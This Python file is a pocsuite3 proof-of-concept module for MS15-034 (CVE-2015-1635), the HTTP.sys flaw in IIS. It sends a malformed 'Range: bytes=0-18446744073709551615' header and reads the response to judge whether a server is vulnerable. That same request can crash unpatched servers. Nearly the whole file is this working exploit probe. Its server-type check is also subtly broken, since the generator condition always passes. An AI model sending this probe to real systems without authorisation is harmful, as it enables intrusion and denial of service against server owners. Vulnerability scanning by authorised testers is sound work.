#!/usr/bin/env python
# coding: utf-8
from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2019-1-8'
    createDate = '2019-1-8'
    updateDate = '2019-1-8'
    references = ['', ]
    name = 'The IIS Vul （CVE-2015-1635，MS15-034）Check'
    appPowerLink = 'https://docs.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-034'
    appName = 'IIS'
    appVersion = '7.0'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
    MS15-034 HTTP.sys DoS And Possible Remote Code Execution.
    HTTP.sys Remote Code Execute.
    '''

    def _verify(self):
        def check(url):
            Server_Tag = ['Microsoft-HTTP', 'Microsoft-IIS']
            try:
                Request_Tmp = req.get(url)
                remote_server = Request_Tmp.headers['server']
                if (tmp_tag in remote_server for tmp_tag in Server_Tag):
                    return test_ms15_034(url)
                else:
                    return (False, 'Web Service Is Not IIS\n[+] May Be ' + remote_server)
            except req.exceptions.ConnectTimeout:
                return (False, 'timeout')
            except Exception as e:
                # raise
                return (False, '{}'.format(str(e)))

        def test_ms15_034(url):
            Req_headers = {'Host': 'stuff',
                           'Range': 'bytes=0-18446744073709551615'}
            Request = req.get(url, headers=Req_headers)
            if b'Requested Range Not Satisfiable' in Request.content:
                return (True, Request.content)
            elif b'The request has an invalid header name' in Request.content:
                return (False, 'The vulnerability has been fixed!')
            else:
                return (False, 'The IIS service was unable to display the vulnerability exists, the need for manual testing!')

        result = {}
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [80]
        for port in ports:
            try:
                url = '{}://{}:{}'.format(pr.scheme, pr.hostname, port)
                status, msg = check(url)
                if status:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(
                        pr.hostname, port)
                    break
            except:
                pass

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
